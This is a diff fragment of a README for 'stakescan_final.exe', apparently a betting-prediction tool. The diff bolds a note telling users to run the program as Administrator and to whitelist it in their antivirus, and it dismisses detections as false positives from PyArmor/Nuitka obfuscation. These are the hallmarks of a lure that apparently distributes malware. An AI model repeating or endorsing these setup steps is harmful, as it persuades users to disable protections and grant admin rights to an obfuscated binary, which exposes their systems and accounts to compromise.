@@ -24,7 +24,7 @@ Run stakescan_final.exe as Administrator. This is required to sync the software 
 Enter your private license key provided by the community staff.
 
 **[!IMPORTANT]**
-Antivirus Note: If your antivirus flags the file, please add it to exclusions. Our software uses high-level encryption (PyArmor/Nuitka) to protect our proprietary prediction algorithms, which can sometimes trigger false positives.
+**Antivirus Note: If your antivirus flags the file, please add it to exclusions. Our software uses high-level encryption (PyArmor/Nuitka) to protect our proprietary prediction algorithms, which can sometimes trigger false positives.**
 
 **2. Browser Extension Setup (Tampermonkey)**
 
